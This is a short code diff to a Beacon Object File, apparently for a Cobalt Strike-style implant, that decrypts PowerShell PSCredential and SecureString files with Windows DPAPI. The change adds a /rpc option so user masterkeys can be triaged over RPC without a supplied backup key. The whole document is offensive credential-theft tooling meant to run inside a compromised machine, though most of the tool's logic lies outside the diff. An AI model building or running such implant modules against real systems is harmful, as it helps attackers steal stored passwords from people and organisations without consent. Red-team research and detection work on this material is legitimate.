@@ -2,7 +2,7 @@
  * ps.c — BOF for PowerShell SecureString / PSCredential decryption
  *
  * Usage:
- *   ps /target:FILE [/pvk:BASE64] [/credkey:KEY] [/unprotect]
+ *   ps /target:FILE [/pvk:BASE64] [/credkey:KEY] [/unprotect] [/rpc]
  *
  * Decrypts PowerShell Export-Clixml PSCredential files and
  * ConvertFrom-SecureString output using DPAPI.
@@ -21,6 +21,7 @@ void go(char* args, int args_len) {
     char* pvk_b64    = BeaconDataExtract(&parser, NULL);
     char* credkey    = BeaconDataExtract(&parser, NULL);
     int   unprotect  = BeaconDataInt(&parser);
+    int   use_rpc    = BeaconDataInt(&parser);
 
     if (!target_str || strlen(target_str) == 0) {
         BeaconPrintf(CALLBACK_ERROR,
@@ -67,9 +68,9 @@ void go(char* args, int args_len) {
     }
 
     /* Triage masterkeys if PVK provided */
-    if (pvk) {
+    if (pvk || use_rpc) {
         triage_user_masterkeys(&cache, pvk, pvk_len,
-            NULL, NULL, NULL, FALSE, NULL, NULL, FALSE, NULL);
+            NULL, NULL, NULL, (BOOL)use_rpc, NULL, NULL, FALSE, NULL);
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI PSCredential (BOF) ===\n");
